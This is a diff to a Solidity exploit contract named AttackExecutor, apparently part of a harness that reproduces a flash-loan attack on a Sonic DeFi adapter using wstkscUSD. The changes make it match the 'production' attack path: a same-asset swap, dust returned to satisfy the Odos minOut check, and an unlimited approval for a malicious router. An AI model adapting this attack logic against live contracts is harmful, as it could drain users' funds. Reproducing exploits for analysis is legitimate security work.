@@ -52,10 +52,8 @@ contract AttackExecutor is Ownable, IWithdrawHook {
 
     uint256 private constant BURST_ONE = 26_230_630_089;
     uint256 private constant BURST_TWO = 8_877_536_706;
-    // NOTE: Production Sonic attack returns 1 µ wstkscUSD as same-asset dust.
-    // Harness currently uses OUTPUT_DUST = 0 with dUSD output (different asset) as workaround
-    // to avoid adapter's same-asset underflow check. See Reproduce.md "Critical Deviation".
-    uint256 private constant OUTPUT_DUST = 0;
+    // Production Sonic attack returns 1 µ wstkscUSD (same-asset dust) to satisfy Odos minOut.
+    uint256 private constant OUTPUT_DUST = 1;
     uint256 private constant FLASH_LOAN_PREMIUM_BPS = 5;
 
     error InvalidPool(address provided);
@@ -88,6 +86,9 @@ contract AttackExecutor is Ownable, IWithdrawHook {
         router = router_;
         adapter = adapter_;
         attackerBeneficiary = attackerBeneficiary_;
+
+        // Allow malicious router to skim same-asset dust during exploit reproduction.
+        collateralErc20.safeApprove(router_, type(uint256).max);
     }
 
     function setPool(address pool_) external onlyOwner {
@@ -156,10 +157,25 @@ contract AttackExecutor is Ownable, IWithdrawHook {
             revert("UNAUTHORIZED_ROUTER");
         }
 
-        // For same-asset swap (exploit path), input and output are both wstkscUSD
+        // For same-asset swap (exploit path), input and output are both wstkscUSD.
         bool isSameAssetSwap = inputToken == outputToken;
+        uint256 burnAmount = amountPulled;
+        bool emitDustEvent;
 
-        if (!isSameAssetSwap) {
+        if (isSameAssetSwap) {
+            if (inputToken != address(collateralToken)) {
+                revert UnexpectedCollateral(inputToken, address(collateralToken));
+            }
+
+            if (OUTPUT_DUST > 0 && amountPulled >= OUTPUT_DUST) {
+                if (amountPulled > OUTPUT_DUST) {
+                    burnAmount = amountPulled - OUTPUT_DUST;
+                } else {
+                    burnAmount = 0;
+                }
+                emitDustEvent = true;
+            }
+        } else {
             // Legacy path: different assets (not used in real exploit)
             if (inputToken != address(collateralToken) || outputToken != address(dusdToken)) {
                 revert("UNEXPECTED_TOKENS");
@@ -168,16 +184,12 @@ contract AttackExecutor is Ownable, IWithdrawHook {
 
         emit FlashLoanRecorded(amountPulled);
 
-        if (flashMintActive) {
-            collateralToken.burn(amountPulled);
+        if (emitDustEvent) {
+            emit CollateralDustReturned(address(adapter), OUTPUT_DUST);
         }
 
-        // Dust return for workaround case (dUSD output, different asset)
-        // Production Sonic attack returns 1 µ wstkscUSD (same-asset), but current harness uses
-        // OUTPUT_DUST = 0 with dUSD to avoid adapter's underflow check.
-        if (OUTPUT_DUST > 0 && !isSameAssetSwap) {
-            IERC20(outputToken).safeTransfer(address(adapter), OUTPUT_DUST);
-            emit CollateralDustReturned(address(adapter), OUTPUT_DUST);
+        if (flashMintActive && burnAmount > 0) {
+            collateralToken.burn(burnAmount);
         }
     }
 
